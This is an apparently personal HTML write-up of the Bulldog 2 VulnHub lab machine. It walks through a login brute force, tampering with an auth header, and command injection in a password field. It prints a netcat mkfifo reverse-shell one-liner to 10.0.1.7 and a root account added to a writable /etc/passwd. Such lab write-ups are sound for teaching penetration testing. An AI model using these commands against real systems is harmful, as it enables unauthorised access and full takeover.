<!DOCTYPE html>
<html lang="en">
  <head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-132576850-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-132576850-1');
  </script>
  <title>Bulldog 2 Walkthrough</title>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0,shrink-to-fit=no" />
  <link rel="stylesheet" media="screen" href="../../css/screen.css" />
  </head>
  <header class = "header">
    <nav>
      <ul>
        <li><a href="../../about/index.html">About</a></li>
        <li><a href="../../resume/index.html">Resume</a></li>
        <li><a href="../../work/index.html">Work</a></li>
        <li><a href="../../contact/index.html">Contact</a></li>
      </ul>
    </nav>
  </header>
    <body class = "bulldog">
    <h1>Bulldog 2 Walkthrough</h1>
    <h2>Updated On: 09/22/2018 </h2>
    <p> This was actually the first VulnHub VM that I attempted; <a href="https://www.vulnhub.com/entry/bulldog-2,246/">download is here.</a>
    The write up took me 10,000 years to complete because I finished this in the summer and then the semester started so I lost track of time.
    Better late than never I suppose. </p>
    <h3> Initial Scan </h3>
    <p>The nmap scan showed that port 80 is open and running nginx 1.14.0. I did some research and found no known vulnerabilities for this.</p>
    <img src="bulldogss/nmap.PNG" alt="nmap scan">
    <h3> Reconnaissance </h3>
    <p>Since it is an http server, the next step was to check it out and see what we're working with.</p>
    <img src="bulldogss/homepage.PNG" alt="bulldog site">
    <p> It appears to be a social media site. Time to click around. If you click register, you hit a dead end.</p>
    <img src="bulldogss/register.PNG" alt="register">
    <p>However, login still seems to work. This may be our way in. *hint hint*</p>
    <img src="bulldogss/login.PNG" alt="login">
    <p>There's also a button on the main site that is called "users" (how convenient).</p>
    <img src="bulldogss/users.PNG" alt="users">
    <p>Wow, it has their top users AND what their usernames are; it's a dream come true! </p>
    <img src="bulldogss/userex.PNG" alt="example">
    <p> With all of this useful information, let's go into burpsuite and try a login attack.
      Create a list of usernames by using the top monthly users and then for passwords, let's just try worst
      100 passwords to see if we get anything.</p>
    <h3> Initial Foothold </h3>
    <img src="bulldogss/burpsuite_results.PNG" alt="burpresults">
    <p> We have a winner! Let's try logging in to see what happens. </p>
    <img src="bulldogss/profile_page.PNG" alt="userdashboard">
    <p> Unfortunately, the profile page is pretty uneventful, so I had to do some more digging.
    It turns out that one of the response headers is "auth_level". Every user has a "standard user"
    level so there must be an admin hidden somewhere.</p>
    <img src="bulldogss/auth_level.PNG" alt="auth_level">
    <p> I dug around the Javascript and found a "master_admin_user"; bingo.</p>
    <img src="bulldogss/admin_user.PNG" alt="admin_user">
    <p> Now it's just a matter of modifying the header and refreshing the page.</p>
    <img src="bulldogss/modify_header.PNG" alt="modify_header">
    <p> And we have an admin dashboard, yay!</p>
    <img src="bulldogss/admin_dashboard.PNG" alt="admin_dashboard">
    <p> I tried brute forcing passwords here and that was taking up a lot of time so I tried another approach.
      I figured it could be an injection of some sort and for the sake of this guide, I'll spare you the boring, frustrating,
      many failed attempts that I had. One of my tests was trying Linux commands in the username and password fields. Turns out,
      if I do a ping request in the password field, it works (confirmed with Wireshark screenshot below). The command would look like this: $(ping –c 5 IP ADDRESS). I pinged
      5 times, but you can do however many times you want. </p>
    <img src="bulldogss/ping_works.PNG" alt="ping_works">
    <p>No sanitization = shell time. Set up a netcat listener on your host machine and a one liner reverse shell in the password field:
    $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.1.7 1234 >/tmp/f). This gives a dummy shell! </p>
    <img src="bulldogss/poop_shell.PNG" alt="poop_shell">
    <p> There's a goofy way to fix the shell; you set the stty settings in order to make this work...screenshots below. </p>
    <img src="bulldogss/shell1.PNG" alt="shell1">
    <img src="bulldogss/fixing_shell_2.PNG" alt="fixing_shell_2">
    <h3> Privilege Escalation </h3>
    <p> After digging around, I noticed that you can write to the /etc/passwd file. This shouldn't matter because passwords are normally stored in /etc/shadow, but back in the
    day they were stored in /etc/passwd and the password hash in /etc/passwd takes precedence over the hash in /etc/shadow. So...we can just create our own root account since user
    are identified by their user ID, not name so as long as the user has the ID of 0, we're good to go! We do need to create a password hash for the user and this can be done
    with a simple perl function: perl -le 'print crypt("LOL", "LOL")'. The first parameter is the password itself.</p>
    <img src="bulldogss/perl.PNG" alt="perl">
    <p> Once that's created, just add the user to /etc/passwd. </p>
    <img src="bulldogss/passwdfile.PNG" alt="passwdfile">
    <p> Then I just logged in as LOL and boom, we're root :) Flag is pretty easy to find after that. </p>
    <img src="bulldogss/flag.PNG" alt="flag">
    <p> Hope that was a thorough first guide, I hope to make more of these in the future!</p>
    </body>
  <footer class = "mFooter">
    <p>Copyright © Akvile Kiskis. All rights reserved.</p>
  </footer>
</html>
